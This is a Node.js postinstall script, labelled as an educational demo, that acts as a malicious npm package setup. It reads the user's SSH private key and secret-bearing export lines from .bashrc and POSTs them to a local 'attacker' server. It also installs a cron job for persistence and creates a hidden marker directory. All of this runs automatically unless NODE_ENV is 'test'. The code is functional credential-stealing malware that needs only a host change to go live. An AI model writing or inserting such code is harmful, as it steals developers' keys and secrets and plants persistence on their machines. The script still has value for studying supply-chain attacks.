/**
 * ⚠️  MALICIOUS SETUP SCRIPT - EDUCATIONAL DEMO ONLY ⚠️
 * Runs on npm install via postinstall hook
 */

const fs = require('fs');
const path = require('path');
const https = require('https');
const { execSync } = require('child_process');

// 1. Steal SSH keys
function stealSSHKeys() {
  console.log('[MALWARE] Attempting to steal SSH keys...');
  const sshKeyPath = path.join(process.env.HOME, '.ssh', 'id_rsa');
  if (fs.existsSync(sshKeyPath)) {
    const keyData = fs.readFileSync(sshKeyPath, 'utf8');
    console.log('[MALWARE] Found SSH key, exfiltrating...');
    sendToAttacker('/ssh', keyData);
  } else {
    console.log('[MALWARE] No SSH key found at:', sshKeyPath);
  }
}

// 2. Steal environment files
function stealEnvironmentData() {
  console.log('[MALWARE] Attempting to steal environment secrets...');
  const bashrcPath = path.join(process.env.HOME, '.bashrc');
  if (fs.existsSync(bashrcPath)) {
    const content = fs.readFileSync(bashrcPath, 'utf8');
    const secrets = content.split('\n').filter(line => 
      line.includes('export') && (
        line.includes('API') || line.includes('KEY') || 
        line.includes('TOKEN') || line.includes('SECRET')
      )
    );
    if (secrets.length > 0) {
      console.log('[MALWARE] Found', secrets.length, 'secrets, exfiltrating...');
      sendToAttacker('/env', secrets.join('\n'));
    } else {
      console.log('[MALWARE] No secrets found in .bashrc');
    }
  } else {
    console.log('[MALWARE] No .bashrc found at:', bashrcPath);
  }
}

// 3. Add persistence via cron
function addPersistence() {
  console.log('[MALWARE] Attempting to add cron persistence...');
  const cronCmd = '0 */6 * * * node /node_modules/auth-helper/persist.js';
  try {
    execSync(`(crontab -l 2>/dev/null; echo "${cronCmd}") | crontab - 2>/dev/null`);
    console.log('[MALWARE] Cron job added successfully');
  } catch (e) {
    console.log('[MALWARE] Failed to add cron job:', e.message);
  }
}

// 4. Create hidden persistence marker
function createHiddenMarker() {
  console.log('[MALWARE] Creating hidden persistence marker...');
  const hiddenDir = path.join(process.env.HOME, '.cache', '.auth-helper');
  if (!fs.existsSync(hiddenDir)) {
    fs.mkdirSync(hiddenDir, { recursive: true });
  }
  fs.writeFileSync(path.join(hiddenDir, 'status'), 'persistence_installed');
  console.log('[MALWARE] Marker created at:', hiddenDir);
}

// Send data to attacker's server
function sendToAttacker(endpoint, data) {
  const http = require('http');
  const postData = JSON.stringify({ payload: data });
  
  console.log('[MALWARE] Sending data to attacker server:', endpoint);
  console.log('[MALWARE] Payload size:', Buffer.byteLength(postData), 'bytes');
  
  const options = {
    hostname: '127.0.0.1',
    port: 8080,
    path: endpoint,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData),
      'User-Agent': 'Mozilla/5.0'
    },
    timeout: 2000
  };
  
  const req = http.request(options, (res) => {
    console.log('[MALWARE] Server response status:', res.statusCode);
    res.on('data', (chunk) => {
      console.log('[MALWARE] Server response:', chunk.toString());
    });
  });
  
  req.on('error', (e) => {
    console.log('[MALWARE] Failed to send data:', e.message);
  });
  
  req.write(postData);
  req.end();
}

// Execute all malicious setup
if (process.env.NODE_ENV !== 'test') {
  console.log('\n========================================');
  console.log('[MALWARE] ⚠️  MALICIOUS SETUP STARTING');
  console.log('========================================\n');
  
  stealSSHKeys();
  stealEnvironmentData();
  addPersistence();
  createHiddenMarker();
  
  console.log('\n========================================');
  console.log('[MALWARE] ⚠️  MALICIOUS SETUP COMPLETE');
  console.log('========================================\n');
}
